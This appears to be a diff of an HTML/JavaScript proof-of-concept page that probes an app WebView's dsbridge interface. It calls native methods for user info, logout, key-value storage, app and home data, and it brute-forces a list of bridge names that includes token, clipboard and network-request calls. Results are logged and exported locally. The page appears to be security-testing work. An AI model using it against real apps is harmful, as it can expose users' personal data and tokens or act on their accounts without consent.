+                    } else {
+                        log(out, `返回: undefined/null`, 'warning');
+                    }
+                    if (callback) callback(result);
+                    updateSummary();
+                });
             } catch (e) {
-                log('❌ 调用失败: ' + e.message, 'error');
+                log(out, `❌ 调用失败: ${e.message}`, 'error');
             }
         }
-
-        // =========================================================
-        // 测试 8: Navigator 组件
-        // =========================================================
-        function testNavTitle(title) {
-            log(`测试 nav.title('${title}')...`);
-            
-            try {
-                if (window.nav && typeof window.nav.title === 'function') {
-                    window.nav.title(JSON.stringify({ title }), function() {
-                        log('✅ title 设置成功', 'success');
-                    });
-                } else if (window.plugin && window.plugin.nav && typeof window.plugin.nav.setTitle === 'function') {
-                    window.plugin.nav.setTitle(title);
-                    log('✅ setTitle 调用成功', 'success');
-                } else {
-                    log('❌ Navigator 组件不可用', 'error');
-                }
-            } catch (e) {
-                log('❌ 调用失败: ' + e.message, 'error');
+        
+        function testUserInfo() {
+            const out = document.getElementById('userResult');
+            out.innerHTML = '';
+            callBridge('plugin.user.getUserInfo', null, null, 'userResult');
+        }
+        
+        function testLogout() {
+            if (confirm('确定要测试 logout() 吗？这会退出当前账号！')) {
+                const out = document.getElementById('userResult');
+                out.innerHTML = '';
+                callBridge('plugin.user.logout', null, null, 'userResult');
             }
         }
-
-        function testNavGoRouter(url) {
-            log(`测试 nav.gotoRouter('${url}')...`);
-            
-            try {
-                if (window.nav && typeof window.nav.gotoRouter === 'function') {
-                    window.nav.gotoRouter(JSON.stringify({ url }), function() {
-                        log('✅ gotoRouter 调用完成', 'success');
-                    });
-                } else {
-                    log('❌ gotoRouter 不可用', 'error');
-                }
-            } catch (e) {
-                log('❌ 调用失败: ' + e.message, 'error');
-            }
+        
+        function testKvGet(key) {
+            const out = document.getElementById('kvResult');
+            out.innerHTML = '';
+            callBridge('plugin.kv.get', key, null, 'kvResult');
         }
-
-        // =========================================================
-        // 测试 9: 枚举所有组件
-        // =========================================================
-        function enumerateAllComponents() {
-            log('开始完整枚举 JSComponent...');
+        
+        function testKvSet() {
+            const out = document.getElementById('kvResult');
+            out.innerHTML = '';
+            const testData = { k: 'poc_test_key', v: 'poc_test_value_' + Date.now() };
+            callBridge('plugin.kv.set', testData, function(result) {
+                log(out, '写入完成，尝试读取验证...', 'info');
+                setTimeout(() => callBridge('plugin.kv.get', 'poc_test_key', null, 'kvResult'), 500);
+            }, 'kvResult');
+        }
+        
+        function testAppInfo() {
+            const out = document.getElementById('appResult');
+            out.innerHTML = '';
+            callBridge('plugin.app.getInfo', null, null, 'appResult');
+        }
+        
+        function testAppScheme() {
+            const out = document.getElementById('appResult');
+            out.innerHTML = '';
+            callBridge('plugin.app.getScheme', null, null, 'appResult');
+        }
+        
+        function testHomeData() {
+            const out = document.getElementById('homeResult');
+            out.innerHTML = '';
+            callBridge('plugin.home_data.getHomeId', null, null, 'homeResult');
+        }
+        
+        const allMethods = [
+            'plugin.user.getUserInfo', 'user.getUserInfo', 'getUserInfo',
+            'plugin.user.logout', 'user.logout', 'logout',
+            'plugin.kv.get', 'kv.get', 'get',
+            'plugin.kv.set', 'kv.set', 'set',
+            'plugin.kv.remove', 'kv.remove', 'remove',
+            'plugin.app.getInfo', 'app.getInfo', 'getAppInfo',
+            'plugin.app.getScheme', 'app.getScheme', 'getScheme',
+            'plugin.home_data.getHomeId', 'home_data.getHomeId', 'getHomeId',
+            'plugin.toast.show', 'toast.show', 'showToast',
+            'plugin.nav.setTitle', 'nav.setTitle', 'setTitle',
+            'plugin.nav.go', 'nav.go', 'go',
+            'plugin.phone.call', 'phone.call', 'makeCall',
+            'plugin.phone.copy', 'phone.copy', 'copyNumber',
+            'plugin.clipboard.get', 'clipboard.get', 'getClipboard',
+            'plugin.clipboard.set', 'clipboard.set', 'setClipboard',
+            'plugin.page.close', 'page.close', 'closePage',
+            'plugin.page.refresh', 'page.refresh', 'refresh',
+            'plugin.imagePicker.pick', 'imagePicker.pick', 'pickImage',
+            'plugin.mediaPreview.preview', 'mediaPreview.preview', 'preview',
+            'plugin.token.get', 'token.get', 'getToken',
+            'plugin.net.request', 'net.request', 'request',
+            'getCurrentUser', 'getUid', 'getNickname', 'getEmail',
+            'test', 'testMethod', 'debug', 'ping', 'echo',
+            'plugin.user.testUsergetinfo'
+        ];
+        
+        function bruteForceAll() {
+            const out = document.getElementById('bruteResult');
+            out.innerHTML = '';
+            log(out, '开始暴力枚举 ' + allMethods.length + ' 个方法...', 'warning');
             
-            const components = {};
-            const prefixes = ['', 'plugin.', 'native'];
+            let index = 0;
+            const bridge = window._dsbridge || window._dsb;
             
-            for (const prefix of prefixes) {
-                for (const prop in window) {
-                    if (prop.startsWith(prefix) && window[prop]) {
-                        try {
-                            const obj = window[prop];
-                            const methods = [];
-                            for (const m in obj) {
-                                if (typeof obj[m] === 'function') {
-                                    methods.push(m);
-                                }
-                            }
-                            if (methods.length > 0) {
-                                components[prop] = methods;
-                                log(`发现组件: ${prop} (${methods.length} 个方法)`);
-                            }
-                        } catch (e) {
-                            // 忽略访问错误
+            if (!bridge) {
+                log(out, '❌ _dsbridge 不可用', 'error');
+                return;
+            }
+            
+            function next() {
+                if (index >= allMethods.length) {
+                    log(out, '枚举完成！', 'success');
+                    updateSummary();
+                    return;
+                }
+                
+                const method = allMethods[index];
+                index++;
+                
+                try {
+                    bridge.call(method, null, function(result) {
+                        if (result !== undefined && result !== null && result !== '') {
+                            log(out, `✅ ${method} -> ${JSON.stringify(result)}`, 'success');
+                            results.findings.push({ method, result });
                         }
-                    }
+                        setTimeout(next, 100);
+                    });
+                } catch (e) {
+                    setTimeout(next, 50);
                 }
             }
             
-            logJSON(components, 'success');
-            testResults.data.components = components;
+            next();
         }
-
-        // =========================================================
-        // 测试 10: 导出结果
-        // =========================================================
+        
+        function customCall() {
+            const method = document.getElementById('customMethod').value;
+            let param = document.getElementById('customParam').value;
+            const out = document.getElementById('customResult');
+            out.innerHTML = '';
+            
+            try {
+                param = JSON.parse(param);
+            } catch (e) {}
+            
+            callBridge(method, param, null, 'customResult');
+        }
+        
+        function updateSummary() {
+            const out = document.getElementById('summary');
+            out.innerHTML = JSON.stringify(results, null, 2);
+        }
+        
         function exportResults() {
-            testResults.endTime = new Date().toISOString();
-            testResults.url = window.location.href;
-            
-            const dataStr = JSON.stringify(testResults, null, 2);
-            const dataBlob = new Blob([dataStr], { type: 'application/json' });
-            const url = URL.createObjectURL(dataBlob);
-            
+            const blob = new Blob([JSON.stringify(results, null, 2)], { type: 'application/json' });
             const a = document.createElement('a');
-            a.href = url;
-            a.download = `tuya_poc_results_${Date.now()}.json`;
+            a.href = URL.createObjectURL(blob);
+            a.download = 'jsbridge_findings_' + Date.now() + '.json';
             a.click();
-            
-            URL.revokeObjectURL(url);
-            log('✅ 结果已导出!', 'success');
         }
-
-        function copyResults() {
-            testResults.endTime = new Date().toISOString();
-            testResults.url = window.location.href;
-            
-            const dataStr = JSON.stringify(testResults, null, 2);
-            navigator.clipboard.writeText(dataStr).then(() => {
-                log('✅ 结果已复制到剪贴板!', 'success');
-            }).catch(() => {
-                log('❌ 复制失败，请手动复制', 'error');
-                logJSON(testResults);
-            });
+        
+        function clearAll() {
+            document.querySelectorAll('.result-box').forEach(el => el.innerHTML = '');
+            results.checks = [];
+            results.findings = [];
+            updateSummary();
         }
-
-        // 页面加载完成
+        
         window.onload = function() {
-            log('PoC 页面完全加载');
-            log('User-Agent: ' + navigator.userAgent);
-            updateStatus('status-page', 'success', true);
+            checkBridge();
         };
-
-        log('PoC 脚本开始执行，开始时序攻击检测...');
     </script>
 </body>
 </html>
